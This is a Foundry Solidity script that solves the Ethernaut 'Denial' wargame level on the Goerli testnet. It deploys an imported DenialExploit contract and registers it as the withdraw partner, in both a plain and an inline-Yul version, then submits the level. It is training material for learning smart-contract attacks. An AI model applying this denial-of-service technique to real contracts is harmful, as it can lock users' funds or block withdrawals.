// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

import { DenialExploit } from "../../contracts/20_Denial.sol";

interface Instance {
    function setWithdrawPartner(address _partner) external;
}

contract DenialScript is EthernautScript {
    string network = "goerli";
    address level = 0xD0a78dB26AA59694f5Cb536B50ef2fa00155C488;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0.001 ether));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        address exploit = address(new DenialExploit());
        instance.setWithdrawPartner(exploit);
    }

    function yulVersion() internal {
        bytes memory code = type(DenialExploit).creationCode;
        assembly {
            let exploit := create(0, add(code, 0x20), mload(code))

            mstore(0, "setWithdrawPartner(address)")
            mstore(0, keccak256(0, 27))
            mstore(4, exploit)
            let success := call(gas(), sload(instance.slot), 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
